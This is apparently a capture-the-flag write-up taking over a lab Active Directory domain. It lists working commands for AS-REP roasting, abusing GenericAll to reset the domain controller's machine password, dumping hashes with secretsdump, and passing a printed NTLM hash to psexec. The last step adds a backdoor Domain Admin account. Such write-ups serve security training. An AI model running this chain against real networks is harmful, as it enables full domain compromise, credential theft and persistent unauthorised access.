# IT Cup Writeup

1. Get possible Usernames from Web (10.0.1.12)
Create users.txt from email-format

2. Try as-reproast
```powershell
impacket-getnpusers -usersfile users.txt -request -format hashcat -dc-ip 10.0.1.11 'plumetech.local/'
```
3. Crack hashes

4. Manually check cracked user
```powershell
$dc = Get-ADComputer -Identity "DC1" -Properties DistinguishedName
$acl = Get-Acl "AD:$($dc.DistinguishedName)"
$acl.Access
```
Find that we have GenericAll on DC

5. Overwrite Machine Account
```powershell
Set-ADAccountPassword -Identity "DC1$" -NewPassword (ConvertTo-SecureString -AsPlainText 'NewPass123!' -Force)
```
6. Run secretsdump
```powershell
impacket-secretsdump 'PLUMETECH.LOCAL/DC1$':'NewPass123!'@10.0.1.11
```

7. Run psexec and create user
```powershell
impacket-psexec 'Administrator@10.0.1.11' -hashes aad3b435b51404eeaad3b435b51404ee:110d175a98fcafce620960d79e5492f1

net1 user plumber P@ssw0rd /add
net1 group "Domain Admins" plumber /ADD /DOMAIN
```